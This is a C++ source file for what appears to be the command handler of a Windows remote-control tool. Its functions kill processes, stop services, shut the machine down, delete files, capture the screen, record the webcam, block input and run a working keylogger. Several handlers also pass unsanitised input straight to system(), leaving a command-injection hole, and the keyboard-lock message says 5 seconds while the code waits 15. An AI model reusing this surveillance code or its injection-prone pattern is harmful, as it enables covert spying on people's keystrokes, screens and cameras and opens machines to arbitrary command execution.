#include "utils.h"
#include "Command.h"

#include <windows.h>
#include <chrono>
#include <thread>
#include <filesystem> 
#include <functional>
#include <opencv2/highgui.hpp> 
#include <opencv2/imgproc.hpp>
#include <opencv2/imgcodecs.hpp>
#include <opencv2/core/utils/logger.hpp>

using namespace std;
using namespace cv;
namespace fs = std::filesystem;

FuncPtr getFuncPtr(const string& cmd) {
    FuncPtr command = NULL;
	if(cmd == "LIST_APP"){
        command = ListApp;
	}
    else if (cmd == "START_APP") {
        command = startApp;
    }
    else if (cmd == "STOP_APP") {
        command = stopApp;
    }
    else if (cmd == "LIST_SERVICE") {
        command = ListService;
    }
    else if (cmd == "START_SERVICE") {
        command = startService;
    }
    else if (cmd == "STOP_SERVICE") {
        command = stopService;
    }
    else if (cmd == "SHUTDOWN") {
        command = ShutdownServer;
	}
    else if (cmd == "RESTART") {
        command = RestartServer;
    }
    else if (cmd == "COPY") {
        command = copyFile;
    }
    else if (cmd == "DELETE"){ 
        command = deleteFile;
    }
    else if (cmd == "CAPTURE") {
        command = captureScreen;
    }
    else if (cmd == "WEBCAM") {
        command = webCam;
    }
    else if (cmd == "KEYLOGGER") {
        command = Keylogger;
    }
    else if (cmd == "KEYLOCK") {
        command = lockKeyboard;
    }
	return command;
}

bool ListApp(const std::string& input, std::string& filename) {
    filename = "list.txt";
    std::string command = "tasklist /FI \"SESSIONNAME eq Console\" /FO LIST > " + filename;
    int result = system(command.c_str());

    if (result == 0) {
        return true;
    }
    else {
        return false;
    }
}

bool startApp(const std::string& input, std::string& filename) {
    std::string command = "start " + input;
    int result = system(command.c_str());
    return result == 0;
}

bool stopApp(const std::string& input, std::string& filename) {
    std::string command = "taskkill /IM " + input + " /F";
    int result = system(command.c_str());
    return result == 0;
}

bool ListService(const std::string& input, std::string& filename) {
    // Thực thi lệnh tasklist để lấy danh sách tiến trình
   /* std::ifstream ip("tasklist /FI \"SESSIONNAME eq Service\"");
    if (!ip.is_open()) {
        std::cerr << "tasklist fail" << std::endl;
        return false;
    }
    std::ofstream op(filename);
    std::string line;
    while (getline(ip, line)) {
        op << line << std::endl;
    }
    ip.close();
    op.close();*/
    // Lệnh tasklist lọc chỉ ứng dụng đang chạy
    filename = "list.txt";
    std::string command = "sc query > " + filename;
    int result = system(command.c_str());

    if (result == 0) {
        return true;
    }
    else {
        return false;
    }
}

bool startService(const std::string& input, std::string& filename) {
    std::string command = "net start " + input;
    int result = system(command.c_str());
    return result == 0;
}

bool stopService(const std::string& input, std::string& filename) {
    std::string command = "net stop " + input;
    int result = system(command.c_str());
    return result == 0;
}

bool ShutdownServer(const std::string& input, std::string& filename) {
    std::string command = "shutdown /s /t " + input;
    int result = system(command.c_str());
    return result == 0;
}

bool RestartServer(const std::string& input, std::string& filename) {
    std::string command = "shutdown /r /t " + input;
    int result = system(command.c_str());
    return result == 0;
}

bool copyFile(const string& input, string& filename) {
    int pos = input.find('\n');
    string sourcePath = input.substr(0, pos);
    string destinationPath = input.substr(pos + 1);
    if (fs::exists(sourcePath) && fs::is_regular_file(sourcePath)) {
        cout << "File nguon hop le.\n";
        try {
            fs::path destPath(destinationPath);
            fs::create_directories(destPath.parent_path());
            fs::copy(sourcePath, destinationPath, fs::copy_options::overwrite_existing);
            cout << "Copy file thanh cong: " << sourcePath << " ----> " << destinationPath << '\n';
            filename = destinationPath;
        }
        catch (const fs::filesystem_error& e) {
            cerr << "Loi xay ra: " << e.what() << '\n';
            return 0;
        }
    }
    else {
        cerr << "File nguon khong hop le hoac khong ton tai. Vui long nhap lai.\n";
        return 0;
    }
    return 1;
}

bool deleteFile(const string& input, string& filename) {
    string filePath = input;
    try {
        if (fs::exists(filePath)) {
            fs::remove(filePath);
            cout << "File da duoc xoa thanh cong.\n";
        }
        else {
            cout << "Duong dan khong hop le\n";
            return 0;
        }
    }
    catch (const fs::filesystem_error& e) {
        cerr << "Loi khi xoa file: " << e.what() << "\n";
        return  0;
    }
    return 1;
}

bool captureScreen(const string& input, string& filename) {
    filename = "image.bmp";
    int x1 = 0, y1 = 0;
    int x2 = GetSystemMetrics(SM_CXSCREEN);
    int y2 = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, x2, y2);
    SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, x2, y2, hScreen, x1, y1, SRCCOPY);
    ReleaseDC(NULL, hScreen);

    BITMAPFILEHEADER fileHeader;
    BITMAPINFOHEADER infoHeader;
    fileHeader.bfType = 0x4D42;
    fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    fileHeader.bfSize = fileHeader.bfOffBits + (x2 * y2 * 4);
    fileHeader.bfReserved1 = 0;
    fileHeader.bfReserved2 = 0;

    infoHeader.biSize = sizeof(BITMAPINFOHEADER);
    infoHeader.biWidth = x2;
    infoHeader.biHeight = -y2;
    infoHeader.biPlanes = 1;
    infoHeader.biBitCount = 32;
    infoHeader.biCompression = BI_RGB;
    infoHeader.biSizeImage = 0;
    infoHeader.biXPelsPerMeter = 0;
    infoHeader.biYPelsPerMeter = 0;
    infoHeader.biClrUsed = 0;
    infoHeader.biClrImportant = 0;

    std::ofstream file(filename, std::ios::out | std::ios::binary);
    file.write((char*)&fileHeader, sizeof(fileHeader));
    file.write((char*)&infoHeader, sizeof(infoHeader));

    int imageSize = x2 * y2 * 4;
    char* bmpData = new char[imageSize];
    GetDIBits(hDC, hBitmap, 0, y2, bmpData, (BITMAPINFO*)&infoHeader, DIB_RGB_COLORS);
    file.write(bmpData, imageSize);
    delete[] bmpData;

    file.close();
    DeleteObject(hBitmap);
    DeleteDC(hDC);
    return true;
}

bool webCam(const string& input, string& filename) {
    cv::utils::logging::setLogLevel(cv::utils::logging::LOG_LEVEL_SILENT);
    VideoCapture cap(0);
    Mat img;
    auto start = chrono::high_resolution_clock::now();
    //Kich thuoc khung hinh
    int frame_width = static_cast<int>(cap.get(CAP_PROP_FRAME_WIDTH));
    int frame_height = static_cast<int>(cap.get(CAP_PROP_FRAME_HEIGHT));
    string output_file = "output.mp4";
    VideoWriter writer(output_file, VideoWriter::fourcc('H', '2', '6', '4'), 30, Size(frame_width, frame_height));
    while (1) {
        cap.read(img);
        if (img.empty()) {
            cout << "Khong the lay hinh anh!" << endl;
            return 0;
        }
        writer.write(img);
        imshow("Image", img);
        auto now = chrono::high_resolution_clock::now();
        auto duration = chrono::duration_cast<chrono::seconds>(now - start).count();
        if (duration >= 10) {
            cout << "Da tat webcam" << endl; break;
        }
        if (waitKey(1) >= 0) break;
    }
    cap.release();
    writer.release();
    destroyAllWindows();
    filename = output_file;
    return 1;
}

bool Keylogger(const string& input, string& filename) {
    ofstream logFile("log.txt");
    if (!logFile.is_open()) {
        cerr << "Không thể mở file log!" << endl; return 0;
    }
    filename = "log.txt";
    auto lastKeyPressTime = chrono::steady_clock::now();
    string keyLog = "";
    while (true) {
        for (int key = 8; key <= 255; key++) {
            SHORT keyState = GetAsyncKeyState(key);
            if (keyState & 0b1) {
                keyLog = "";
                switch (key) {
                case VK_SPACE: keyLog = "[SPACE] "; break;
                case VK_ESCAPE: keyLog = "[ESC] "; break;
                case VK_RETURN: keyLog = "[ENTER] "; break;
                case VK_TAB: keyLog = "[TAB] "; break;
                case VK_SHIFT: keyLog = "[SHIFT] "; break;
                case VK_BACK: keyLog = "[BACKSPACE] "; break;
                case VK_RBUTTON: keyLog = "[RIGHT_CLICK] "; break;
                case VK_LBUTTON: keyLog = "[LEFT_CLICK] "; break;
                case VK_CONTROL: keyLog = "[CTRL] "; break;
                case VK_MENU: keyLog = "[ALT] "; break;
                case VK_CAPITAL: keyLog = "[CAPS_LOCK] "; break;
                case VK_LEFT: keyLog = "[LEFT] "; break;
                case VK_RIGHT: keyLog = "[RIGHT] "; break;
                case VK_UP: keyLog = "[UP] "; break;
                case VK_DOWN: keyLog = "[DOWN] "; break;
                case 0x30: keyLog = "[0] "; break;
                case 0x31: keyLog = "[1] "; break;
                case 0x32: keyLog = "[2] "; break;
                case 0x33: keyLog = "[3] "; break;
                case 0x34: keyLog = "[4] "; break;
                case 0x35: keyLog = "[5] "; break;
                case 0x36: keyLog = "[6] "; break;
                case 0x37: keyLog = "[7] "; break;
                case 0x38: keyLog = "[8] "; break;
                case 0x39: keyLog = "[9] "; break;
                case VK_OEM_PLUS: keyLog = "[+] "; break;
                case VK_OEM_MINUS: keyLog = "[-] "; break;
                case VK_OEM_5: keyLog = "[|] "; break;
                case VK_OEM_7: keyLog = "['] "; break;
                case VK_OEM_COMMA: keyLog = "[,] "; break;
                case VK_OEM_PERIOD: keyLog = "[.] "; break;
                case VK_OEM_1: keyLog = "[;] "; break;
                case VK_OEM_2: keyLog = "[/] "; break;
                case VK_OEM_3: keyLog = "[`] "; break;
                case VK_LWIN: keyLog = "[WINDOWS] "; break;
                case VK_F1: keyLog = "[F1] "; break;
                case VK_F2: keyLog = "[F2] "; break;
                case VK_F3: keyLog = "[F3] "; break;
                case VK_F4: keyLog = "[F4] "; break;
                case VK_F5: keyLog = "[F5] "; break;
                case VK_F6: keyLog = "[F6] "; break;
                case VK_F7: keyLog = "[F7] "; break;
                case VK_F8: keyLog = "[F8] "; break;
                case VK_F9: keyLog = "[F9] "; break;
                case VK_F10: keyLog = "[F10] "; break;
                case VK_F11: keyLog = "[F11] "; break;
                case VK_F12: keyLog = "[F12] "; break;
                default:
                    if (isalpha(key)) {
                        keyLog += (char)key;
                    }
                    break;
                }
                if (!keyLog.empty()) {
                    logFile << keyLog;
                    logFile.flush();
                    lastKeyPressTime = chrono::steady_clock::now();
                }
            }
        }
        auto currentTime = chrono::steady_clock::now();
        auto timeSinceLastPress = chrono::duration_cast<chrono::seconds>(currentTime - lastKeyPressTime);
        if (timeSinceLastPress.count() >= 5) {
            break;
        }
        this_thread::sleep_for(chrono::milliseconds(50));
    }
    logFile.close();
    return 1;
}

bool lockKeyboard(const string& input, string& filename) {
    cout << "Khoa ban phim va chuot trong 5 giay...\n" << endl;
    if (BlockInput(TRUE)) {
        cout << "Da khoa thanh cong sau 5 giay ban phim se dung duoc!\n" << endl;
        this_thread::sleep_for(std::chrono::seconds(15));
        BlockInput(FALSE);
        cout << "Da mo khoa!\n" << endl;
    }
    else {
        cerr << "Khoa the khoa ban phim va chuot. Vui long mo quyen Administrator!\n" << endl;
        return 0;
    }
    return 1;
}


